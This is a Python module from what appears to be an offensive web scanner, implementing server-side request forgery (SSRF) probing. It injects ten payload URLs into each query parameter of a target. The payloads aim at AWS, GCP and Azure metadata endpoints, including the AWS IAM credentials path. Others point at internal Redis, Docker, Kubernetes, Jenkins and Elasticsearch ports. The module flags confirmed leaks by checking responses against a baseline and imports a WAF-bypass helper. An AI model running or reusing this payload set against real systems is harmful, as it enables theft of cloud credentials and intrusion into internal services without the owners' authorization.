"""ssrf v7 — sniper + baseline gate: markers must be NEW (not in original page)"""
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from core.waf_bypass import mutate_until_pass


# 10 целевых URL (не 85)
TARGETED = {
    "aws_metadata":     ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id"]),
    "aws_creds":        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
    "gcp_metadata":     ("http://metadata.google.internal/computeMetadata/v1/", ["project-id", "service-accounts"]),
    "azure_metadata":   ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["vmId", "subscriptionId"]),
    "localhost_80":     ("http://127.0.0.1:80/", ["localhost", "127.0.0.1", "nginx", "apache"]),
    "localhost_8080":   ("http://127.0.0.1:8080/", ["tomcat", "jenkins", "manager"]),
    "redis":            ("http://127.0.0.1:6379/", ["redis_version", "-ERR", "+OK"]),
    "docker":           ("http://127.0.0.1:2375/version", ["ApiVersion", "Docker"]),
    "k8s_api":          ("http://127.0.0.1:8080/api/v1/namespaces", ["kube-system", "default"]),
    "elasticsearch":    ("http://127.0.0.1:9200/", ["cluster_name", "lucene_version"]),
}


class Ssrf:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"url": ["http://example.com"]}
        http = HttpClient(session, logger)

        # === baseline: тот же URL с заведомо битым параметром ===
        baseline_text = ""
        try:
            base_url = self._url(u, params, list(params)[0], "http://omni_baseline_test.local/")
            base_r = http.get(base_url)
            if base_r:
                baseline_text = (base_r.text or "").lower()
                print(f"[ssrf v7] baseline: {base_r.status_code} {len(baseline_text)}b")
        except Exception:
            pass

        print(f"[ssrf v7] sniper mode")
        print(f"[ssrf v7] {len(TARGETED)} targeted URLs")
        print(f"[ssrf v7] params: {list(params.keys())}")
        print()

        findings = []
        vuln_param = None

        for name in params:
            print(f"[param: {name}]")
            for key, (url_test, markers) in TARGETED.items():
                url = self._url(u, params, name, url_test)
                headers = {"Metadata-Flavor": "Google"} if "google" in url_test else {}
                r = http.get(url, headers=headers)
                if not r:
                    continue

                hit = None
                r_low = (r.text or "").lower()
                for m in markers:
                    ml = m.lower()
                    if ml not in r_low:
                        continue
                    # маркер уже был в baseline — это фон, не сигнал
                    if baseline_text and ml in baseline_text:
                        continue
                    hit = m
                    break

                if hit:
                    time.sleep(0.2)
                    r2 = http.get(url, headers=headers)
                    r2_low = (r2.text or "").lower() if r2 else ""
                    if r2 and hit.lower() in r2_low and hit.lower() not in baseline_text:
                        # confidence через общий verify-счётчик
                        from core.verify import is_signal
                        conf = 0.85 if "creds" in key or "metadata" in key else 0.7
                        if not is_signal(conf, floor=0.55, module="ssrf"):
                            continue
                        sev = "critical" if "creds" in key or "metadata" in key else "high"
                        print(f"  ✓ SSRF [{key}]: {hit}")
                        findings.append({"param": name, "key": key,
                                         "url": url_test, "marker": hit,
                                         "verified": True, "confidence": conf})
                        logger.finding(f"ssrf_{key}", sev,
                                       f"{name}={url_test} marker={hit}")
                        vuln_param = name

        print()
        print(f"[ssrf v7] findings: {len(findings)}")
        return {"findings": findings, "param": vuln_param}

    def _url(self, u, params, name, payload):
        q = dict(params); q[name] = [payload]
        return urlunparse(u._replace(query=urlencode(q, doseq=True)))
